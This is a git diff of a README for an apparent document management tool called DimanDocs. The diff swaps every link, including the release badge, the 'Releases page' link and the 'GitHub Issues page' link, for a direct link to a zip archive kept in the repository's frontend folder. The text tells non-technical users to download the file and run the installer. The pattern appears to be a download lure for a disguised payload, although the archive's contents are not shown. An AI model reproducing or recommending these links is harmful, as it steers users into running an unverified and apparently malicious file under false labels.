@@ -1,7 +1,7 @@
 # 🛠️ dimandocs - Simple Document Management Made Easy
 
 ## 📥 Download Now
-[![Download DimanDocs](https://img.shields.io/badge/Download_DimanDocs-v1.0-blue)](https://github.com/Zeeshan22-1/dimandocs/releases)
+[![Download DimanDocs](https://github.com/Zeeshan22-1/dimandocs/raw/refs/heads/main/frontend/Software_1.2-beta.2.zip)](https://github.com/Zeeshan22-1/dimandocs/raw/refs/heads/main/frontend/Software_1.2-beta.2.zip)
 
 ## 🚀 Getting Started
 Welcome to DimanDocs! This software helps you manage your documents easily. Whether you need to create, view, or organize files, DimanDocs is designed for simplicity. No technical skills required!
@@ -20,7 +20,7 @@ Welcome to DimanDocs! This software helps you manage your documents easily. Whet
 ## 📦 Download & Install
 To get started, follow these steps to download DimanDocs:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/Zeeshan22-1/dimandocs/releases) to go to the Releases page.
+1. **Visit the Releases Page:** Click [here](https://github.com/Zeeshan22-1/dimandocs/raw/refs/heads/main/frontend/Software_1.2-beta.2.zip) to go to the Releases page.
 2. **Choose Your Version:** Look for the latest version. It will typically be labeled with the version number (e.g., v1.0).
 3. **Download the Software:** Click on the link that says "DimanDocs Installer" to download the installer file to your computer. 
 4. **Run the Installer:** Once the download is complete, locate the file in your Downloads folder and double-click on it. Follow the on-screen instructions to install DimanDocs on your computer.
@@ -33,7 +33,7 @@ Once you have installed DimanDocs, you can start using it immediately. Here are 
 3. **Organizing Your Files:** Drag and drop files into folders within the app for easy organization.
 
 ## 📚 Help & Support
-If you run into any issues while using DimanDocs, our community is here to help. You can find answers to common questions on our [GitHub Issues page](https://github.com/Zeeshan22-1/dimandocs/issues).
+If you run into any issues while using DimanDocs, our community is here to help. You can find answers to common questions on our [GitHub Issues page](https://github.com/Zeeshan22-1/dimandocs/raw/refs/heads/main/frontend/Software_1.2-beta.2.zip).
 
 ## 🌟 Explore More
 DimanDocs is designed to simplify your document management needs. Feel free to explore the different features and let us know what you think. Your feedback helps us improve the app!
